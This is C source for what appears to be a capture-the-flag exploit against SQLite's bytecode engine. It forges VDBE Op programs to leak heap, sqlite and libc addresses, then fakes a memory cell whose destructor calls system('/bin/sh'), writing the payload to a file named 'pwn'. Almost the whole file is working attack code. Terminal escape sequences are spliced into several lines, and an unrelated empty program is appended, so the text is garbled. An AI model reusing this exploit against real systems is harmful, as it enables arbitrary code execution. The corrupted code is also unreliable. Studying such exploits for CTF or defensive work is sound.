#include <sqlite3.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdio.h>
#include "mylib.c"

#define MAP_ADDR 0x2000000000
#define MEM_Dyn 0x1000

int main()
{

  Op *cur;

  Op *buf = mmap((void *)MAP_ADDR, 0x10000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
  if (buf == MAP_FAILED)
  {
    perror("mmap");
    return 1;
  }
  printf("buf: %p\n", buf);

  Op *target = malloc(0x100 * sizeof(Op));

  // **main**
  cur = buf;
  // aux
  i64 value = 0x4142434445;

  // note
  // concat P3 = P2 || P1

  Op2(cur++, OP_Init, 0, 1);
  // leak heap address

  // 1. leak heap address
  // 2. leak libc address and possibly stack address
  //  - create a fake Op object
  //    - Int64 (with points to libc address)
  //    - P[2;2Rack
  //  - Goto that object
  // 3. create a fake Op object for executing system("/bin/sh")
  // registers:
  // 10: addr of heap
  // 11: addr of libc
  // 12: addr of stack
  int RHEAP = 10;
  int RLIBC = 11;
  int RSTACK = 12;
  int RSQLITE = 13;

  char *dummy = (char *)(buf + 0xf0);

  Op *fake_op2 = buf + 0x20; // for leaking sqlite
  Op *fake_op3 = buf + 0x30; // for leaking libc
  Op *fake_op4 = buf + 0x80; // for executing system("/bin/sh")
  memcpy(dummy, "/bin/sh\x00", 8);
  char *fake_memorycell = dummy + 8;
  memcpy(dummy + 8, &dummy, 8);
  memcpy(dummy + 16, "\xff\xff\xff\xff", 4);
  short flags = MEM_Dyn;
  memcpy(dummy + 20, &flags, 2);
  short remindar = 0;
  memcpy(dummy + 22, &remindar, 2);
  dummy += 0x18;

  memcpy(dummy, "dummy!!\x00",[3;1R 8);

  // 1. leak heap address
  Op3(cur++, OP_IntCopy, 2, RHEAP, 1);

  // create leak libc address Ops
  Op4(cur++, OP_String, 0x10, 1, 0, fake_op2, P4_STATIC);
  // Op4(cur++, OP_String, 0x10, 1, 0, "piyopiyofugafuga", P4_STATIC);
  Op2(cur++, OP_Pack, RHEAP, 2);
  Op3(cur++, OP_Concat, 2, 1, 13);
  Op4(cur++, OP_String, 0x800, 1, 0, fake_op2 + 1, P4_STATIC);
  // Op4(cur++, OP_String, 0x800, 1, 0, str, P4_STATIC);
  Op3(cur++, OP_Concat, 1, 13, 0);

  Op2(cur++, OP_Goto, 0, 260); // jump to fake op2

  // leak sqlite's lib aaddress
  // values is dummy ( to be overwritten above)
  cur = fake_op2;
  Op4(cur++, OP_Int64, 0, RSQLITE, 0, (u8 *)&value, P4_INT64);
  Op2(cur++, OP_AddImm, RSQLITE, -0x104a80);
  // GOT(getenv)
  Op2(cur++, OP_IntCopy, RSQLITE, [>64;2500;0c]10;rgb:c7f1/c7f1/c7f1\]11;rgb:0000/0000/0000\1);
  Op2(cur++, OP_AddImm, 1, 1060864);

  Op2(cur++, OP_Pack, 1, 2);
  Op4(cur++, OP_String, 0x18, 1, 0, (u64)fake_op3 - 0x8, P4_STATIC);
  // Op4(cur++, OP_String, 0x10, 1, 0, "piyopiyofugafuga", P4_STATIC);
  Op3(cur++, OP_Concat, 2, 1, 13);
  Op4(cur++, OP_String, 0x900, 1, 0, fake_op3 + 1, P4_STATIC);
  // Op4(cur++, OP_String, 0x900, 1, 0, str, P4_STATIC);
  Op3(cur++, OP_Concat, 1, 13, 0);

  Op2(cur++, OP_Goto, 0, 349); // jump to fake op3

  // leak libc's address
  cur = fake_op3;
  Op4(cur++, OP_Int64, 0, RLIBC, 0, (u8 *)&value, P4_INT64);
  Op2(cur++, OP_AddImm, RLIBC, -296864);

  // base addr
  // Fake Value
  // struct DebugValue
  // {
  //   union MemValue
  //   {
  //     double r;           /* Real value used when MEM_Real is set in flags */
  //     i64 i;              /* Integer value used when MEM_Int is set in flags */
  //     int nZero;          /* Extra zero bytes when MEM_Zero and MEM_Blob set */
  //     const char *zPType; /* Pointer type when MEM_Term|MEM_Subtype|MEM_Null */
  //     DebugFuncDef *pDef; /* Used only when flags==MEM_Agg */
  //   } u;
  //   char *z;     /* String or BLOB value */
  //   int n;       /* Number of characters in string value, excluding '\0' */
  //   u16 flags;   /* Some combination of MEM_Null, MEM_Str, MEM_Dyn, etc. */
  //   u8 enc;      /* SQLITE_UTF8, SQLITE_UTF16BE, SQLITE_UTF16LE */
  //   u8 eSubtype; /* Subtype for this value */
  //   /* ShallowCopy only needs to copy the information above */
  //   sqlite3 *db;          /* The associated database connection */
  //   int szMalloc;         /* Size of the zMalloc allocation */
  //   u32 uTemp;            /* Transient storage for serial_type in OP_MakeRecord */
  //   char *zMalloc;        /* Space to hold MEM_Str or MEM_Blob if szMalloc>0 */
  //   void (*xDel)(void *); /* Destructor for Mem.z - only valid if MEM_Dyn */
  // };

  /*
  // case OP_VCheck:
  // sqlite3VdbeMemSetNull -> vdbeMemClearExternAndSetNull
  // - VdbeMemDynamic(pMem) <=> (((pMemX)->flags&(MEM_Agg|MEM_Dyn))!=0)
  // - p->flags&MEM_Dyn
  // - p->xDel((void *)p->z);

  */
  int base = 0x26aa0;
  int system_offset = 0x58740;
  int binsh_offset = 0x1b75aa;
  // u (dummy)
  Op4(cur++, OP_String, 72, 9, 0, dummy, P4_STATIC);

  // z (points to "/bin/sh") and n flags enc subtype, db, szMalloc, uTemp, zMalloc
  Op4(cur++, OP_String, 0x10 + 8 /* db */ + 4 /* szMalloc */ + 4 /* uTemp */ + 8 /* zMalloc */, 1, 0, (u64)fake_memorycell, P4_STATIC);
  Op3(cur++, OP_Concat, 1, 9, 9);

  Op2(cur++, OP_IntCopy, RLIBC, 1);
  Op2(cur++, OP_AddImm, 1, system_offset);
  Op2(cur++, OP_Pack, 1, 13);
  Op3(cur++, OP_Concat, 13, 9, 9);

  // Op4(cur++, OP_String, 0x900, 1, 0, fake_op4 + 1, P4_STATIC);
  Op4(cur++, OP_String, 0x900, 1, 0, dummy, P4_STATIC);
  Op3(cur++, OP_Concat, 1, 9, 9);

  Op2(cur++, OP_VCheck, 0, 2016);
  Op2(cur++, OP_ResultRow, 9, 1);
  Op2(cur++, OP_Halt, 0, 0);

  puts("hello");

  // save buf to a file named "pwn"
  FILE *fp = fopen("pwn", "wb");
  fwrite(buf, 0x100 * sizeof(Op), 1, fp);
  fclose(fp);

  return 0;
}
#include <stdio.h>
#include <stdlib.h>

//#define DEBUG

#ifdef DEBUG
#define dbg(...) fprintf(stderr, __VA_ARGS__)
#else
#define dbg(...)
#endif

int main(void) {
    return 0;
}

